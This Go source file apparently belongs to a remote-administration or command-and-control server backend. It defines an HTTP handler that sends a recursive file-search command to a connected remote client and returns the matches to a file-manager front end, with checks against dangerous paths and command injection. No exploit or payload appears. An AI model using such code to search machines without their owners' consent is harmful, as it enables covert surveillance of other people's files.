package api

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/sendcommand"
	"context"
	"log"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// FileSearch 递归文件搜索(功能批):按起点目录+关键字搜索,客户端回 FileBrowse
// 同格式(D/F 行),复用 fileBrowserQueue 通道与 ParseDirectoryString 解析——
// 前端文件管理器无需新渲染逻辑。
// 请求: { uid, dirPath(起点目录), keyword, maxResults(可选,默认 500) }
func FileSearch(c *gin.Context) {
	var body struct {
		Uid        string `json:"uid"`
		DirPath    string `json:"dirPath"`
		Keyword    string `json:"keyword"`
		MaxResults int    `json:"maxResults"`
	}
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if body.Keyword == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "keyword is empty"})
		return
	}
	if body.DirPath == "" {
		body.DirPath = "/"
	}
	// 路径校验（危险路径防御,与 FileBrowse 同规则）
	if msg := ValidateDangerousPath(body.DirPath); msg != "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "路径非法: " + msg})
		return
	}
	if body.MaxResults <= 0 || body.MaxResults > 5000 {
		body.MaxResults = 500
	}

	// 检查客户端连接状态
	connection.MuClientListenerType.Lock()
	_, exists := connection.ClientListenerType[body.Uid]
	connection.MuClientListenerType.Unlock()
	if !exists {
		c.JSON(http.StatusBadRequest, gin.H{
			"error":        "客户端未连接或已断开连接",
			"disconnected": true,
			"uid":          body.Uid,
		})
		return
	}

	// 关键字不得包含协议分隔符(防注入 filesearch 参数结构)
	if strings.ContainsAny(body.Keyword, "|\x00") {
		c.JSON(http.StatusBadRequest, gin.H{"error": "关键字包含非法字符"})
		return
	}

	log.Printf("FileSearch request - UID: %s, Dir: %s, Keyword: %s", body.Uid, body.DirPath, body.Keyword)

	// 命令参数: <startDir>|<maxResults>|<keyword>(客户端 CmdFileSearch 解析)
	sendcommand.SendCommand(body.Uid, "filesearch "+body.DirPath+"|"+strconv.Itoa(body.MaxResults)+"|"+body.Keyword)

	// 搜索超时较浏览更长(递归扫描耗时;客户端自身也有 30s 截断)
	queue := command.VarFileBrowserQueue.GetOrCreateQueue(body.Uid)
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	select {
	case fileSearchStr := <-queue:
		// 无匹配:客户端回 SEARCH...\nNO_MATCH 标记
		if strings.Contains(fileSearchStr, "\nNO_MATCH") {
			c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": nil, "noMatch": true})
			return
		}
		fileTree := command.ParseDirectoryString(body.Uid, fileSearchStr)
		c.Header("Content-Type", "application/json; charset=utf-8")
		c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "data": fileTree})
	case <-command.GetClientOfflineSignal(body.Uid):
		c.JSON(http.StatusRequestTimeout, gin.H{"error": "客户端已离线"})
	case <-ctx.Done():
		c.JSON(http.StatusRequestTimeout, gin.H{
			"error":   "文件搜索超时(目标目录过大或网络延迟),可尝试缩小起始目录或关键字范围",
			"timeout": true,
		})
	}
}
